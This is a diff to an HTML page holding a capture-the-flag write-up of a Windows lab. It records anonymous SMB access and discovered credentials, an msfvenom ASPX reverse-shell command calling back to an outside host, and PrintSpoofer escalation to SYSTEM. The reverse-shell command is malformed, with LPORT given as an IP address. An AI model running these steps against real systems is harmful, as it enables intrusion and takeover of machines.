@@ -326,7 +326,7 @@
                     <li>SMB signing was <strong>disabled</strong></li>
                     <li>Anonymous and guest access was allowed to the <code>nt4wrksv</code> share</li>
                 </ul>
-                <img src="Images/relevant_smbclient">
+                <img src="Images/relevant_smbclient.png">
             
                 <h2>Credentials Discovered</h2>
                 <ul>
@@ -334,7 +334,7 @@
                     <li>Bill: <code>Juw4nnaM4n420696969!$$$</code></li>
                 </ul>
             
-                <p>Unfortunately initial post-compromise techniques such as Kerberoasting, AS-REP Roasting, and secretsdump yielded no viable attack paths or privilege escalation opportunities.</p>
+                <p>Unfortunately initial post-compromise techniques such as Kerberoasting, AS-REP Roasting, secretsdump, etc, yielded no viable attack paths or privilege escalation opportunities.</p>
             
                 <h2>Web Enumeration</h2>
                 <ul>
@@ -347,7 +347,7 @@
                 <p>Uploaded an <strong>ASPX reverse shell</strong> using SMB which is ideal for IIS/ASP.NET targets.</p>
                 <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.230.117 LPORT=10.6.36.131 -f aspx > shell.aspx</code></pre>
                 <p>Triggered the reverse shell through the exposed web path tied to <code>nt4wrksv</code>.</p>
-                <img src="Images/relevant_priv">
+                <img src="Images/relevant_priv.png">
                 
                 <h2>Privilege Escalation</h2>
                 <ul>
@@ -356,7 +356,7 @@
                     <li>Used <strong>PrintSpoofer</strong> successfully — achieved <strong>NT AUTHORITY\SYSTEM</strong></li>
                 </ul>
                 <p><pre><code>PrintSpoofer64.exe -i -c cmd</code></pre></p>
-                <img src="Images/relevant_nt_authority">
+                <img src="Images/relevant_nt_authority.png">
 
             </div>
             <div class="subsection" onclick="toggleSubsection('ctf3')">Coming soon!</div>
